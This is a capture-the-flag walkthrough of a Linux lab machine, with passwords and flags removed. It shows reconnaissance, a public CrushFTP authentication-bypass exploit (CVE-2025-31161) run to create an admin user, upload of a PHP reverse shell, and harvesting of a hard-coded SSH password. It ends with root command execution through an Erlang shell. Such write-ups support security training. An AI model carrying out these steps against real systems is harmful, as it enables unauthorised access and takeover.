## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
- Easy
- Linux
```
## IP-Address
```IP-Address
10.129.246.188
```
## Rust-Scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Gobuster 
- Search For `Hidden Directory`
```bash
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/
```
- Look For `Subdomain`
```bash
ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
```
- Add `Virtual Host`
## Browser
- At `http:/ftp/soulmate.htb` it redirect to `webApp/login.html`\
- and its `Crushftp` Web-App So I looked for Recent Vulnerability
```bash
searchsploit crush ftp                                                
Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)   | windows/dos/17795.py
CrushFTP 11.3.1 - Authentication Bypass       | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities     | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal       | multiple/remote/52012.py
```
- Authentication Bypass
```bash
$ git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git
Cloning into 'CVE-2025-31161'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 9 (delta 3), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 6.02 KiB | 166.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.
cd CVE-2025-31161                     
ls
cve-2025-31161.py  LICENSE  README.md
└─$ python cve-2025-31161.py    
  [-] Target host not specified
usage: cve-2025-31161.py [-h] [--target_host TARGET_HOST] [--port PORT] [--target_user TARGET_USER] [--new_user NEW_USER] [--password PASSWORD]

Exploit CVE-2025-31161 to create a new account

options:
  -h, --help            show this help message and exit
  --target_host      TARGET_HOST        Target host
  --port PORT                           Target port
  --target_user      TARGET_USER        Target user
  --new_user           NEW_USER          New user to create
  --password           PASSWORD         Password for the new user

$ python cve-2025-31161.py  --target_host ftp.soulmate.htb --port 80 --target_user root --new_user bandit --password bandit
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: banditt
   [*] Password: bandit.
```
- Access the Browser with new Creds
- Got Access to user manager & change the Password for user `ben`
```notes
- Login as Ben
- opened the file system and upload Reverse shell script
- `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`
- Got the Reverse-shell
```
- Access The Internal File system as `www-data`
```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ uname -a
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```
--- 
## User Exploitation
```bash
find / -type f \( -iname "*.db" -o -iname "*.sqlite" \) 2>/dev/null
/var/lib/PackageKit/transactions.db
/var/lib/fwupd/pending.db
/var/lib/command-not-found/commands.db
/var/www/soulmate.htb/data/soulmate.db
/usr/lib/firmware/regulatory.db
/usr/lib/x86_64-linux-gnu/avahi/service-types.db
/usr/share/doc/xtrans-dev/xtrans.html.db
```
- Got `/var/www/soulmate.htb/data/soulmate.db`
```bash
cat /var/www/soulmate.htb/data/soulmate.db
P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)8OtableusersusersCREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
|||     '33admin[hash omitted]Administrator2025-08-10 13:00:082025-08-10 12:59:39
users$
```
- Using Linpeas Got This File
```bash

$ pwd
/usr/local/lib/erlang_login
$ cat start.erlang
$ cat start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "[password omitted]"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```
- Got the Credentials
```Creds
user_passwords,"ben", "[password omitted]",
```
### User Login
```bash
ssh ben@soulmate.htb
Password - [password omitted]
cat user.txt
[flag omitted]
```
- User Flag
```Flag
[flag omitted]
```
--- 
## Privilege Escalation
```bash
 ben@soulmate:~$ whoami
ben
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
ben@soulmate:~$ uname -a
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
ben@soulmate:~$ sudo -l
[sudo] password for ben:
Sorry, user ben may not run sudo on soulmate.
ben@soulmate:~$ ss -tuln
Netid      State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process
udp        UNCONN      0           0                127.0.0.53%lo:53               
udp        UNCONN      0           0                  0.0.0.0:68                   
tcp        LISTEN      0           4096             127.0.0.53%lo:53               
tcp        LISTEN      0           4096                 127.0.0.1:9090             
tcp        LISTEN      0           4096                   0.0.0.0:4369             
tcp        LISTEN      0           5                    127.0.0.1:2222             
tcp        LISTEN      0           4096                 127.0.0.1:8443             
tcp        LISTEN      0           511                    0.0.0.0:80               
tcp        LISTEN      0           128                    0.0.0.0:22               
tcp        LISTEN      0           128                  127.0.0.1:40709            
tcp        LISTEN      0           4096                 127.0.0.1:8080             
tcp        LISTEN      0           4096                 127.0.0.1:36145            
tcp        LISTEN      0           4096                      [::]:4369             
tcp        LISTEN      0           511                       [::]:80               
tcp        LISTEN      0           128                       [::]:22               
ben@soulmate:~$ nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
ls
Protocol mismatch.ssh
ben@soulmate:~$ nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
ssh
Protocol mismatch.ssh
```
#### SSH Protocol
- Erlang shell #Erlang_shell
```bash
 ben@soulmate:~$ ssh -p 2222 127.0.0.1
ben@127.0.0.1's password:
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> help().
(ssh_runner@soulmate)1> help().
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true
```
- Root Flag
```bash
(ssh_runner@soulmate)3> os:cmd("whoami").
"root\n"
(ssh_runner@soulmate)2> file:read_file("/root/root.txt").
{ok,<<"[flag omitted]\n">>}
```
#### Root Flag
```Flag
[flag omitted]
```
# END